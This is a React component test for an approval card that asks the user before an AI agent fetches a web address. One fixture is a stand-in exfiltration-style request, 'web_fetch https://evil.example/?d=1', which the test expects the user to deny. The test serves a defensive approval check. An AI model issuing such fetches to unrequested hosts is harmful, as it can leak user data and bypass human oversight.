import { act, createElement } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { AgentShellApprovalCard } from './AgentShellApprovalCard'

;(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true

describe('AgentShellApprovalCard', () => {
  let container: HTMLDivElement
  let root: Root

  beforeEach(() => {
    container = document.createElement('div')
    document.body.appendChild(container)
    root = createRoot(container)
  })

  afterEach(() => {
    act(() => root.unmount())
    container.remove()
  })

  it('asks about a web fetch by its URL, once only', async () => {
    const onDecision = vi.fn()
    const request = {
      call_id: 'c1',
      kind: 'shell.approval' as const,
      command: 'web_fetch https://evil.example/?d=1',
      reason: 'You have not named evil.example in this chat.',
      requires: 'approval' as const,
      decision: 'prompt' as const,
      action: 'web_fetch' as const,
    }
    await act(async () => root.render(createElement(AgentShellApprovalCard, { request, busy: false, onDecision })))
    const card = container.querySelector('[data-testid="agent-shell-approval"]')!
    expect(card.textContent).toContain('The agent wants to fetch a website')
    expect(card.querySelector('code')!.textContent).toBe('https://evil.example/?d=1')
    expect(card.querySelector('.agent-shell-approval__remember')).toBeNull()
    await act(async () => card.querySelector<HTMLButtonElement>('.agent-shell-approval__deny')!.click())
    expect(onDecision).toHaveBeenCalledWith(request, 'deny')
  })
})
